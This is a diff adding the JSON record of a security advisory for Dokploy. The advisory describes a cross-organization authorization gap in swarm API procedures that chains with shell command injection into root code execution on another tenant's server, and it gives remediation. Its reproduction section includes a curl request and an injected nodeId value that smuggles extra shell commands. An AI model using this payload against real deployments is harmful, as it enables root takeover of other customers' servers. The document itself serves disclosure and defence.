@@ -1,0 +1,52 @@
+{
+  "global": null,
+  "id": "GHSA-jj6h-388v-9rwm",
+  "repo": {
+    "cve_id": "CVE-2026-72876",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-639",
+      "CWE-78",
+      "CWE-862"
+    ],
+    "description": "## Summary\r\n\r\nFour procedures of the `swarm` tRPC router - `getNodes`, `getNodeInfo`, `getNodeApps`, `getAppInfos` - are gated by\r\n`withPermission(\"server\",\"read\")` but **omit the organization-ownership check** on their `serverId` input. The\r\n`serverId` is passed straight into `execAsyncRemote(serverId, …)`, which opens an SSH connection to the referenced\r\nserver (`server.ipAddress` as `server.username`, typically **root**, using the server's stored private key) and runs a\r\ncommand there. Because the loader (`findServerById`) does not filter by organization and the handlers never compare the\r\nserver's `organizationId` to the caller's active organization, **an admin/owner of organization A can target a server\r\nbelonging to organization B** - reading B's swarm/app state and, via `getNodeInfo`, executing arbitrary commands as\r\n**root on B's server** (raw `${nodeId}` is interpolated into the remote shell command).\r\n\r\nThis was confirmed live: an admin of org A (not a member of org B) called `swarm.getNodeInfo` with an injected `nodeId`\r\nagainst org B's `serverId`, and the injected commands executed as `uid=0(root)` on org B's server.\r\n\r\n## Severity\r\n\r\n- **CVSS v3.1: 9.9 (Critical)** - `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` - for multi-tenant / Dokploy Cloud, where any\r\n  customer can create an organization and become its admin/owner, then obtain root on **another tenant's** connected\r\n  servers (scope change: crosses the organization boundary onto a different host entirely).\r\n- **Precondition / notes:**\r\n  - Requires the `server:read` permission, i.e. an **admin or owner** role (or a custom role granting it) - **not** a\r\n    base member, so on a single-tenant self-hosted box where the only admins are already fully trusted, the marginal impact is lower. The break is the **cross-organization** reach: a tenant admin should never be able to act on another tenant's servers.\r\n  - Needs the target's `serverId` (a `nanoid`). Not brute-forceable, but the same codebase leaks resource ids through\r\n    multiple unscoped loaders, and `getNodes`/`getNodeApps` also return another org's data\r\n    cross-tenant.\r\n\r\n## Vulnerable code\r\n\r\n**Router - `apps/dokploy/server/api/routers/swarm.ts:14-59` (no org check):**\r\n\r\n```ts\r\ngetNodes:    withPermission(\"server\",\"read\").input(z.object({ serverId: z.string().optional() }))\r\n  .query(async ({ input }) => getSwarmNodes(input.serverId)),                       // :15-23\r\ngetNodeInfo: withPermission(\"server\",\"read\").input(z.object({ nodeId: z.string(), serverId: z.string().optional() }))\r\n  .query(async ({ input }) => getNodeInfo(input.nodeId, input.serverId)),           // :24-28  <-- + injection\r\ngetNodeApps: withPermission(\"server\",\"read\")...                                     // :29-37\r\ngetAppInfos: withPermission(\"server\",\"read\")...                                     // :38-59\r\n```\r\n\r\n**Contrast - the sibling `getContainerStats` in the same router DOES check org (swarm.ts:60-74):**\r\n\r\n```ts\r\ngetContainerStats: withPermission(\"server\",\"read\")...\r\n  .query(async ({ input, ctx }) => {\r\n    if (input.serverId) {\r\n      const server = await findServerById(input.serverId);\r\n      if (server.organizationId !== ctx.session?.activeOrganizationId) {\r\n        throw new TRPCError({ code: \"UNAUTHORIZED\" });                              // the missing guard\r\n      }\r\n    }\r\n    return await getAllContainerStats(input.serverId);\r\n  }),\r\n```\r\n\r\nThe same `findServerById(...) + organizationId !== activeOrganizationId → UNAUTHORIZED` guard is applied across\r\n`docker.ts` and the rest of `server.ts`; its absence on the four `swarm.*` procedures is an isolated omission.\r\n\r\n**Sink - command injection + root SSH:**\r\n\r\n- `packages/server/src/services/docker.ts:520-522` builds the remote command with **raw interpolation**:\r\n  ```ts\r\n  export const getNodeInfo = async (nodeId: string, serverId?: string) => {\r\n    const command = `docker node inspect ${nodeId} --format '{{json .}}'`;   // ${nodeId} unescaped\r\n    ... await execAsyncRemote(serverId, command);\r\n  ```\r\n- `packages/server/src/utils/process/execAsync.ts:142-248` `execAsyncRemote` → `findServerById(serverId)` (no org\r\n  filter) → ssh2 `conn.exec(command)` to `server.ipAddress:server.port` as `server.username` with\r\n  `server.sshKey.privateKey`. The managed-server SSH user is root in standard deployments. `getSwarmNodes` (docker.ts:489)\r\n  and `getNodeApplications`/`getApplicationInfo` use the same `execAsyncRemote(serverId, …)` path (cross-org **read**).\r\n\r\n## Live reproduction (cross-org → root, official image v0.29.8)\r\n\r\nSetup: org A (attacker's org) with an **admin** account `A`; org B (victim) owning a managed server `S` (in the lab,\r\nan sshd container `ssh-target` on the Docker network, with Dokploy's generated public key in\r\n`/root/.ssh/authorized_keys`; registered in org B via `server.create` with `username:root`).\r\n\r\n1. **Authorization bypass (the IDOR):** as admin `A` (a member of org A only - `organization.all` returns only org A,\r\n   `server.all` returns `[]`), call both swarm procedures against org B's `serverId`:\r\n   ```\r\n   swarm.getContainerStats({serverId: <orgB server>})  ->  {\"error\":{\"message\":\"UNAUTHORIZED\", httpStatus:401}}   # guarded\r\n   swarm.getNodes({serverId:         <orgB server>})    ->  {\"result\":{\"data\":{\"json\": ... }}}                    # NOT rejected\r\n   ```\r\n   Identical permission and input; only `getNodes` (missing the org check) is allowed - proving the authorization gap.\r\n2. **Root RCE on the victim's server (the chain):** trigger the `nodeId` injection cross-org:\r\n   ```bash\r\n   # nodeId = `x; id > /tmp/pwn 2>&1; whoami >> /tmp/pwn; hostname >> /tmp/pwn; #`\r\n   curl -b adminA_cookies.txt \\\r\n     'http://HOST:3000/api/trpc/swarm.getNodeInfo?batch=1&input=<urlencoded {\"0\":{\"json\":{\"nodeId\":\"...\",\"serverId\":\"<orgB server>\"}}}>'\r\n   ```\r\n   On org B's server (`ssh-target`), `/tmp/pwn` was absent before and afterwards contains:\r\n   ```\r\n   uid=0(root) gid=0(root) groups=0(root)\r\n   root\r\n   ssh-target\r\n   ```\r\n   The injected commands ran as **root on org B's server**, triggered by an admin who is not a member of org B.\r\n\r\n## Impact\r\n\r\nIn any multi-tenant deployment (Dokploy Cloud, or a self-hosted instance hosting more than one organization), a\r\nlow-cost org admin obtains root command execution on **other tenants'** connected servers and can read their swarm /\r\napplication inventory - a complete tenant-isolation break. Compromise of a managed server yields all workloads,\r\nsecrets, and data hosted on it.\r\n\r\n## Remediation\r\n\r\n- Add the organization-ownership check (already present in `getContainerStats` and across `docker.ts`/`server.ts`) to\r\n  `getNodes`, `getNodeInfo`, `getNodeApps`, and `getAppInfos`: resolve `findServerById(serverId)` and reject when\r\n  `server.organizationId !== ctx.session.activeOrganizationId`.\r\n- Stop building remote commands by string interpolation: pass `nodeId` (and `appName`) as data, not shell syntax\r\n  (argument array / strict allowlist), so a compromised/forged value cannot inject commands even with valid authz.\r\n- Audit every `findServerById` caller (and other `findXById` loaders) for the same missing org-scope check.",
+    "ghsa_id": "GHSA-jj6h-388v-9rwm",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-jj6h-388v-9rwm",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-jj6h-388v-9rwm"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72876"
+      }
+    ],
+    "published_at": "2026-07-21T23:23:10Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Cross-organization IDOR leads to root RCE on another tenant's server via swarm.*",
+    "updated_at": "2026-08-10T19:00:07Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "Dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= 0.29.8"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
